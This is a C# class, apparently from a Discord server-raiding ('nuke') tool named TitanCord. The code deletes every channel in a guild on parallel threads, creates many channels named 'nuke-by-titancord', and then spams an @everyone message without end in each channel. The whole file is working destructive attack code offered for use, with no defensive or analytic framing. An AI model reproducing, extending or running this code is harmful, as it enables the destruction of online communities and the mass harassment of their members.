public class TaskModifyChannels
{
    public static void DoTask(string guildId, TitanCordManager _titanCordManager, string channels, string message)
    {
        TitanCordUtils.Log("CHANNELS", $"Obtaining Channel IDs for the guild {guildId}.");
        List<DiscordChannel> discordChannels = _titanCordManager.GetChannels(guildId);
        string channelIds = "";

        foreach (DiscordChannel discordChannel in discordChannels)
        {
            if (channelIds == "")
            {
                channelIds = discordChannel.Id;
            }
            else
            {
                channelIds += ", " + discordChannel.Id;
            }
        }

        TitanCordUtils.Log("CHANNELS", $"Got the Channel IDs for the guild {guildId} ({discordChannels.Count} channels) => [{channelIds}].");
        TitanCordUtils.Log("CHANNELS", "The objective is now to delete all the channels. Proceeding.");

        int totalChannels = discordChannels.Count, currentDeletedChannels = 0;

        foreach (DiscordChannel discordChannel in discordChannels)
        {
            Thread thread = new Thread(() =>
            {
                _titanCordManager.DeleteChannel(discordChannel.Id);
                TitanCordUtils.Log("CHANNELS", $"Deleted channel {discordChannel.Id} successfully.");
                Interlocked.Increment(ref currentDeletedChannels);
            });

            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }

        while (currentDeletedChannels != totalChannels)
        {
            Thread.Sleep(1);
        }

        TitanCordUtils.Log("CHANNELS", $"Succesfully deleted all the {totalChannels} channels.");

        int channelsNumber = int.Parse(channels), currentCreatedChannels = 0;
        TitanCordUtils.Log("CHANNELS", $"The objective is now to create the request amount of channels ({channels}). Proceeding.");

        for (int i = 0; i < channelsNumber; i++)
        {
            Thread thread = new Thread(() =>
            {
                _titanCordManager.CreateChannel(guildId, "☢️・nuke-by-titancord", DiscordChannelType.Text);
                TitanCordUtils.Log("CHANNELS", "Succesfully created a channel!");
                Interlocked.Increment(ref currentCreatedChannels);
            });

            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }

        while (currentCreatedChannels != channelsNumber)
        {
            Thread.Sleep(1);
        }

        discordChannels = _titanCordManager.GetChannels(guildId);
        message = "@everyone " + message;

        TitanCordUtils.Log("CHANNELS", $"Succesfully created {channelsNumber} text channels in the guild.");
        TitanCordUtils.Log("CHANNELS", $"The final objective is now to spam the same message ('{message}') in all the text channels. Proceeding.");

        message = TitanCordUtils.CreateMessage(message);
        int sentMessages = 0;

        foreach (DiscordChannel discordChannel in discordChannels)
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    _titanCordManager.SendMessage(discordChannel.Id, message);
                    Interlocked.Increment(ref sentMessages);
                }
            });

            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }
}